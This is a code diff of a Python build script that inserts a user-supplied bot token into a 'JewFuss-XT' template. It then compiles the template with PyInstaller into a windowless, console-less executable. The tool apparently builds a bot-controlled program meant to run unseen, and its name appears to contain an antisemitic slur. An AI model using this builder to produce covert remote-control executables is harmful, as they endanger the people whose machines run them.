@@ -4,13 +4,14 @@ import tempfile
 import subprocess
 import time
 
-save_unpackaged = True # This is the only thing you should mess with otherwise you may break it
+save_unpackaged = True  # This is the only thing you should mess with otherwise you may break it
 
 template_path = os.path.abspath('./source/JewFuss-XT.template.py')
 output_dir = os.path.abspath('builds')
 output_path = os.path.join(output_dir, 'JewFuss-XT.exe')
 log_file_path = os.path.join(output_dir, 'easy-compiler-build.log')
-token = 'TOKEN = "BOT-TOKEN-GOES-HERE"'
+search_string = '# Do not remove this string (easy compiler looks for this) - 23r98h'
+
 while True:
     user_input = input('Please enter bot token:\n>> ').strip()
     if user_input:
@@ -19,19 +20,20 @@ while True:
     else:
         print("Error: input cannot be empty\n")
 
-
 print("\nTemplate path:", template_path)
 print("\nOutput directory:", output_dir)
-print("\nOutput location:", output_path +"\n")
+print("\nOutput location:", output_path + "\n")
 
 with open(template_path, 'r', encoding='utf-8') as file:
-    content = file.read()
+    lines = file.readlines()
 
-content = content.replace(token, user_input)
+for i, line in enumerate(lines):
+    if search_string in line:
+        lines[i] = user_input + '\n'
+        break
 
 temp_dir = tempfile.mkdtemp()
 temp_file = os.path.join(temp_dir, 'temp.py')
-
 
 if os.path.exists(output_path):
     timestamp = time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime())
@@ -45,13 +47,13 @@ elif not os.path.exists(output_dir):
 timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
 
 with open(temp_file, 'w', encoding='utf-8') as file:
-    file.write(content)
+    file.writelines(lines)
 
-if save_unpackaged == True:
+if save_unpackaged:
     with open("./builds/unpackaged-latest.py", 'w', encoding='utf-8') as file:
-        file.write(content)
+        file.writelines(lines)
 
-subprocess.run(['pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', '--distpath=builds', '--workpath=data' , '-n=JewFuss-XT.exe'])
+subprocess.run(['pyinstaller', temp_file, '--onefile', '--windowed', '--noconsole', '--distpath=builds', '--workpath=data', '-n=JewFuss-XT.exe'])
 shutil.rmtree(temp_dir)
 
 with open(log_file_path, 'a') as log_file:
